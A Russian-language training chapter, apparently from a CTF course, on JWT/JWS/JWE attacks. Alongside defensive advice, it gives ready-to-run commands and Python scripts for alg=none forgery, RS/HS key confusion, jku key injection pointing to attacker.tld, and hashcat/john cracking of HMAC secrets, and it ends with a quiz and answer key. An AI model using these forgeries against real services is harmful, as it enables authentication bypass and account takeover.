---
id: crypto-jwt-crypto
title: "Криптография JWT/JWS/JWE: alg confusion и восстановление ключей"
category: crypto
parent: crypto-hmac
difficulty: medium
order: 1
tags: [crypto, jwt, jws, jwe, hmac, rsa, alg-confusion, jwk, jku, x5u, kid]
prerequisites: [crypto-hmac, crypto-rsa-basics, crypto-ecc]
useful_for:
  - "Атаковать JWT: alg=none, HS/RS confusion, jwk/jku"
  - "Понимать JWS/JWE и их криптографию"
  - "Восстанавливать HMAC-секрет подписей"
estimated_minutes: 42
summary: "Криптография JWT/JWS/JWE: структура, алгоритмы (HS256/RS256/ES256/EdDSA), атаки alg=none, RS/HS confusion, внедрение jwk/jku/x5u, слабый kid, восстановление HMAC-секрета, JWE, полный набор команд jwt_tool/hashcat/john."
---

JWT — самый распространённый формат токенов в вебе, и почти каждая его уязвимость лежит на стыке криптографии и логики разбора. Сервер получает от клиента **и данные, и указание, как их проверять** (`alg` в заголовке) — и если он доверяет второму, атакующий переписывает первое. В этой главе: структура JWS/JWE, все классические атаки с точными командами, восстановление секретов и разбор типичных ошибок реализации.

## Структура JWT

JWT = три сегмента, разделённые точками, каждый — **base64url без padding**:

```
base64url(header) . base64url(payload) . base64url(signature)
```

- **header** — JSON: `{"alg":"HS256","typ":"JWT"}` плюс опциональные `kid`, `jwk`, `jku`, `x5u`, `cty`.
- **payload** — JSON с claims (`sub`, `iss`, `exp`, `iat`, `role`, ...).
- **signature** — подпись JWS: `Sign(key, base64url(header) + "." + base64url(payload))`.

Алгоритмы: `HS256/384/512` (HMAC, симметричный), `RS256/384/512` (RSASSA-PKCS1-v1_5), `PS256` (RSA-PSS), `ES256/384/512` (ECDSA), `EdDSA` (Ed25519), `none` (без подписи).

Важно различать: **JWS** = подпись/целостность (то, что обычно называют JWT), **JWE** = шифрование (5 частей), **JWK/JWKS** = представление ключей.

## alg=none

Если сервер принимает `alg: none` (или пустую/отсутствующую подпись), токен подделывается тривиально — третий сегмент оставляют пустым:

```bash
# вручную
HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
PAYLOAD=$(echo -n '{"sub":"admin","role":"admin"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
curl -s "http://target/admin" -H "Authorization: Bearer ${HEADER}.${PAYLOAD}."

# jwt_tool
python3 jwt_tool.py <JWT> -X a
python3 jwt_tool.py <JWT> -X n          # null signature
```

Защита: **жёсткий whitelist** алгоритмов на сервере; `none` не должен входить в него никогда.

## RS/HS confusion

Сервер настроен на `RS256` и проверяет подпись **публичным** ключом. Атакующий меняет `alg` на `HS256` и подписывает токен **HMAC, используя публичный ключ (в виде PEM-строки) как секрет**. Если библиотека слепо следует `alg` из токена, HMAC-проверка пройдёт «тем же» ключом.

```python
import jwt
pub = open("public.pem", "rb").read()
tok = jwt.encode({"sub":"admin"}, pub, algorithm="HS256")
```

```bash
python3 jwt_tool.py <JWT> -X k -pk public.pem      # классический confusion
# варианты: -X i (jwk injection), -X s (jku)
```

Нюанс: подпись должна совпасть байт-в-байт, поэтому важен точный формат ключа (LF vs CRLF, `-----BEGIN PUBLIC KEY-----`). Иногда перебирают несколько вариантов представления ключа.

Защита: фиксировать алгоритм на сервере; не выводить `alg` из токена; использовать библиотеку, которая принимает *ожидаемый* алгоритм явно.

## Внедрение ключей: jwk, jku, x5u, kid

Заголовок может указывать серверу, **где взять ключ проверки**:

- **`jwk`** — публичный ключ встроен в заголовок. Если сервер ему доверяет — атакующий подставляет свой ключ и подписывает им.
- **`jku`** — URL к JWKS. Если сервер загружает ключ по URL без whitelist — подмена (и SSRF).
- **`x5u`** — URL X.509-сертификата; та же логика.
- **`kid`** — идентификатор ключа. Через него бывают: path traversal (`../../dev/null`), SQLi в lookup, выбор «none»-ключа, совпадение с именем файла.

```json
{"alg":"RS256","jku":"https://attacker.tld/jwks.json","kid":"k1"}
```

Защита: whitelist `jku`/`x5u`, никогда не доверять `jwk` из самого токена, валидировать `kid` (не подставлять в путь/SQL).

## Восстановление HMAC-секрета

`HS256` — симметричный: секрет на сервере и в подписи. Если он слабый, он подбирается **офлайн** (сервер не участвует):

```bash
# hashcat (mode 16500 = JWT)
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
hashcat -m 16500 -a 3 jwt.txt ?a?a?a?a?a?a          # маска
hashcat -m 16500 jwt.txt --show

# john
john --format=HMAC-SHA256 jwt.txt --wordlist=rockyou.txt
```

Перед брутом уберите перевод строки и используйте **полный** токен `header.payload.signature`. Если секрет найден — forge любой payload тем же ключом:

```python
import jwt
tok = jwt.encode({"sub":"admin","role":"admin"}, "найденный_секрет", algorithm="HS256")
```

Для `RS256` секрета нет — но при RS/HS confusion «секрет» = публичный ключ, который известен.

## JWE (шифрование, 5 частей)

JWE = `header.encrypted_key.iv.ciphertext.tag`. Заголовок содержит `alg` (как обёрнут CEK: `RSA-OAEP`, `A128KW`, `dir`, `ECDH-ES`) и `enc` (как шифруется контент: `A256GCM`, `A128CBC-HS256`). Ошибки:

- неверная проверка `alg`/`enc` (принимается `dir`/`none`);
- ключ в заголовке (`jwk`) или в `encrypted_key` без аутентификации;
- повторное использование IV (ломает GCM, см. `crypto-gcm`);
- не проверяется тег аутентичности.

## Инструменты

| Инструмент | Назначение | Команда |
|-----------|-----------|---------|
| jwt_tool | все атаки автоматически | `python3 jwt_tool.py <JWT> -X a` |
| jwt.io | декодирование | вставить токен в браузере |
| hashcat | брутфорс HMAC | `hashcat -m 16500 jwt.txt wl.txt` |
| john | брутфорс HMAC | `john --format=HMAC-SHA256 jwt.txt` |
| Burp JWT Editor | ручная правка/подпись | BApp Store |

```bash
python3 jwt_tool.py <JWT> -M at -t http://target/api   # полный автотест атак
python3 jwt_tool.py <JWT> -T                              # tamper интерактивно
python3 jwt_tool.py <JWT> -C -d wordlist.txt             # crack secret
```

## Разобранный пример: RS/HS confusion end-to-end

1. Сервер отдаёт публичный ключ на `/jwks.json` (или он в PEM на `/pubkey`).
2. Захватываем легитимный токен, декодируем: `alg=RS256`.
3. Подставляем `alg=HS256`, подписываем публичным ключом как HMAC-секретом.
4. Отправляем на защищённый эндпоинт — сервер принимает и выдаёт админ-доступ.

```python
import jwt, requests
pub = open("public.pem", "rb").read()
token = jwt.encode({"sub":"admin","role":"admin"}, pub, algorithm="HS256")
r = requests.get("http://target/admin", cookies={"token": token})
print(r.status_code, r.text[:200])
```

Признак успеха: `200` и админ-контент вместо `403`/`401`. Если `401` — проверьте формат ключа (LF/CRLF) и что сервер действительно выводит `alg` из токена.

## Частые ошибки и тупики

- **Путать JWS и JWE.** JWS — подпись (3 части), JWE — шифрование (5 частей).
- **Не проверить `alg`.** Whitelist обязателен на сервере; без него — confusion.
- **Стандартный base64 вместо base64url.** `+/` → `-_`, убрать `=`.
- **Игнорировать `kid`.** Часто именно через него выбирают ключ/путь.
- **Считать RS256 безопасным.** Confusion обходит асимметрию полностью.
- **Брутить HMAC без полного токена.** Нужны все три сегмента, без `\n`.
- **`exp`/`iat`/`nbf` в прозе.** Не забудьте проверить сроки — иначе сервер отклонит даже валидную подпись.

## Что дальше (decision)

1. Токен декодируется, `alg=none` → пробуйте `-X a` / `-X n`.
2. `alg=RS256`, есть публичный ключ → RS/HS confusion (`-X k -pk`).
3. Есть `jku`/`x5u`/`jwk` → подмена ключа (`-X s` / `-X i`).
4. `alg=HS256`, секрет неочевиден → офлайн-брут (`-m 16500`).
5. Всё закрыто → смотрите `kid` (traversal/SQLi) и JWE-режим.
6. Не JWT вовсе → переходите к `crypto-hmac` (length extension) и `web-auth-bypass-idor`.

## Справочная таблица атак

| Атака | Условие | Инструмент |
|-------|---------|-----------|
| alg=none | сервер принимает без подписи | `jwt_tool -X a` |
| RS/HS confusion | `alg` из токена, есть публичный ключ | `jwt_tool -X k -pk` |
| jwk injection | доверие встроенному ключу | `jwt_tool -X i` |
| jku/x5u SSRF | загрузка ключа по URL | `jwt_tool -X s` |
| weak HMAC secret | HS256, слабый секрет | `hashcat -m 16500` |
| kid traversal/SQLi | `kid` в пути/запросе | ручной/`sqlmap` |

## Полный разбор: атака на JWE

JWE-токен имеет 5 частей: `header.encrypted_key.iv.ciphertext.tag`. Частые ошибки:

- **Приём `alg: none`/`dir`** без проверки — если `alg=dir`, «ключ» берётся из `encrypted_key` напрямую; подсунув свой ключ, атакующий расшифрует/подделает.
- **Ключ в заголовке (`jwk`).** Как и в JWS, доверие встроенному ключу ломает схему.
- **Повтор IV.** GCM внутри JWE с повтором IV → many-time pad и подделка тега (`crypto-iv-reuse`).
- **Не проверяется тег.** Тогда `ciphertext` модифицируется свободно.

```bash
# декодировать части JWE
python3 - <<'EOF'
import base64, json
tok = open('jwe.txt').read().strip()
h, ek, iv, ct, tag = tok.split('.')
def d(s): return base64.urlsafe_b64decode(s + '='*(-len(s)%4))
print(json.loads(d(h)))
EOF
```

Проверяйте: какой `alg`/`enc` принимает сервер, доверяет ли он `jwk`/`jku`, уникален ли IV, проверяется ли тег. Часто «JWE» в CTF — это просто обфусцированный JWS, и после декодирования применимы атаки из предыдущих разделов.

## Квиз

```quiz
- question: "JWT состоит из:"
  options:
    - "header.payload.signature (base64url)"
    - "только payload"
    - "двух частей"
    - "бинарного блоба"
  answer: 0
- question: "alg=none опасен, если:"
  options:
    - "сервер принимает токены без подписи"
    - "ключ короткий"
    - "используется RSA"
    - "payload длинный"
  answer: 0
- question: "В чём суть RS/HS confusion?"
  options:
    - "подписываем HMAC, используя публичный RSA-ключ как секрет"
    - "ломаем AES"
    - "факторизуем n"
    - "используем alg=none"
  answer: 0
- question: "Чем опасен jku в заголовке?"
  options:
    - "сервер может загрузить ключ по URL атакующего (SSRF/подмена)"
    - "ничем"
    - "ускоряет проверку"
    - "сжимает токен"
  answer: 0
- question: "Как восстановить HMAC-секрет HS256?"
  options:
    - "офлайн-брутфорс (hashcat -m 16500 / john)"
    - "факторизацией"
    - "XOR"
    - "никак"
  answer: 0
```

## Где пригодится

- **CTF (hard):** подделка JWT, confusion, jku, слабый секрет.
- **Bug bounty:** аутентификация на JWT в реальных приложениях, OAuth/OIDC.
- **Пентест API:** токены доступа, refresh-токены, микросервисы.
- **Аудит:** проверка корректности валидации JWT/JWS/JWE.
- **Крипто-разработка:** whitelist алгоритмов, безопасное хранение ключей.
